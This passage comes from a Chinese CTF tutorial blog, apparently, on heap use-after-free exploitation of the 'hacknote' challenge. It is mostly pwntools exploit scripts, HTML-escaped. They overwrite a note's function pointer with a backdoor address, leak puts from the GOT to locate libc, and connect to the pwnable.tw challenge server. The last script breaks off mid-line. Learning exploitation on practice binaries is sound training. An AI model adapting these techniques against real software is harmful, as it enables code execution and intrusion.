class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./hacknote&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;addnote&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size, content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delnote&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;printnote&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;idx&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(idx))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(r)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;magic = &lt;span class=&#34;number&#34;&gt;0x08048986&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addnote(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;aaaa&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# add note 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addnote(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;ddaa&amp;quot;&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# add note 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delnote(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# delete note 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delnote(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# delete note 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addnote(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;, p32(magic)) &lt;span class=&#34;comment&#34;&gt;# add note 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;printnote(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# print note 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		修改自己的exp&lt;/p&gt;
&lt;p&gt;​		1.数字都给加上str() 转换一下就可以了&lt;/p&gt;
&lt;p&gt;​		2.输入的字符串可以把b去了&lt;/p&gt;
&lt;p&gt;这下顺眼多了&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./hacknote&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;length,context&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;size&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Print&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(&lt;span class=&#34;number&#34;&gt;0x08048986&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Print(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recv(1024)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;泄露libc&#34;&gt;&lt;a href=&#34;#泄露libc&#34; class=&#34;headerlink&#34; title=&#34;泄露libc&#34;&gt;&lt;/a&gt;泄露libc&lt;/h3&gt;&lt;p&gt;​		没有后门函数,那就需要泄露libc地址后system、getshell. 把调用的函数地址修改成puts函数的地址,那怎么传参数呢? 参数要用栈,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    #### puts
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		这是把堆当成栈来用了吗… 也不是, 这个不能用plt的puts来打印,因为没有栈传递参数,但它本身是有一个打印的函数的,正常情况下是打印存储的数据的,如下图,0x0804862b是打印函数,调用这个函数打印0x0804b018地址存储的数据,所以我们可以把这里改成puts的got表地址,就可以打印出来它的内容了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-15-%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUse-After-Free/image-20230416105824835.png&#34; alt=&#34;image-20230416105824835&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		puts_addr &amp;#x3D; u32(io.recv(4)) 这样写还有问题&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = io.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;here:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(puts_addr)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;​		调试一下就会发现有问题,打印的地方不对,在接收这个之前,其实还会接收到那一堆的提示信息,所以先把提示信息接收到,再接收地址即可&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Print(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recv()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;puts_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;here:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(puts_addr))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;后面再继续申请的话,编号是多少呢?&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(&lt;span class=&#34;number&#34;&gt;0x804862B&lt;/span&gt;) + p32(elf.got[&lt;span class=&#34;string&#34;&gt;&amp;quot;puts&amp;quot;&lt;/span&gt;])) &lt;span class=&#34;comment&#34;&gt;//编号是多少???&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;i386&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myelf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./hacknote&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc_32.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;chall.pwnable.tw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10102&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;size :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;print_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span 